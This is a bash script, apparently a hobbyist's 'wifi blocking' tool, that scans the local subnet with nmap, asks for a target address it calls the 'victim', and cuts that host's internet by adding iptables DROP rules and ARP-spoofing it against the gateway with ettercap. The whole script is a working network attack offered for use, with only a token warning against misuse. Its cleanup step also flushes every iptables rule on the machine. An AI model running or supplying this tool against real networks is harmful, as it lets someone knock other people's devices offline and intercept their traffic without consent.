#! /bin/bash
echo "Hi this is cyber stranger and this is a tool for blocking wifi in your own network organization"

echo "Warning! This tool should not be used for any misleading purpose"

echo "Lol i know this is not a big tool but still i am saying"
network_interfaces=($(ip -o link show | awk -F': ' '{print $2}' | grep -v lo))
interface_count=${#network_interfaces[@]}

num=0
if [ "$interface_count" -eq 0 ]; then
    echo "Empty"
	exit 1
else
    echo "Found $interface_count interfaces"
    echo "please select one interface from this interfaces"
    for iface in "${network_interfaces[@]}"
	do
		num+=1
		echo "$num. $iface"
	done
fi
found=false

read selected_interface
# Loop through the list
for item in "${network_interfaces[@]}"; do
    if [[ "$item" == "$selected_interface" ]]; then
        found=true
        break
    fi
done

if [[ "$found" == true ]]; then
    echo "super ra bittu '$selected_interface' found in the list"
     ip_addr=$(ip -4 addr show "$selected_interface" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
    echo "The ip address of this one is $ip_addr"
else
    echo "super ra bittu '$selected_interface' not found in the list"
	exit 1
fi

subnet=$(echo "$ip_addr" | awk -F. '{print $1"."$2"."$3".0"}')
gateway=$(echo "$ip_addr" | awk -F. '{print $1"."$2"."$3".1"}')

echo "finding the hosts on the subnet: $subnet"

mapfile -t hosts_array < <(
    sudo nmap -sn "$subnet/24" | awk '/Nmap scan report/{print $5}'
)

echo "Total hosts found: ${#hosts_array[@]}"

for host in "${hosts_array[@]}"; do
    echo "Host: $host"
done
echo "please enter the ip address you want"
read wanted_ip
founds=false
for items in "${hosts_array[@]}"; do
    if [[ "$items" == "$wanted_ip" ]]; then
        founds=true
        break
    fi
done

echo "DEBUG:"
echo "iface=[$selected_interface]"
echo "victim=[$wanted_ip]"
echo "gateway=[$gateway]"

if [[ "$founds" == true ]]; then
    echo "super ra bittu '$wanted_ip' found in the list"
    echo "[+] Blocking internet for $wanted_ip"

    # Enable forwarding
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null

    # Block victim traffic
    sudo iptables -A FORWARD -s "$wanted_ip" -j DROP
    sudo iptables -A FORWARD -d "$wanted_ip" -j DROP

    echo "[+] Starting Ettercap (TEXT MODE)"
    echo "[+] Press CTRL+C to stop"
	
    sudo ettercap -T -q -i "$selected_interface" -M arp:spoof /"$wanted_ip"// /"$gateway"//
    echo "[+] Cleaning up..."
    sudo iptables -F
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
    echo "[✓] Internet restored"
else
    echo "super ra bittu '$wanted_ip' not found in the list"
    exit 1
fi

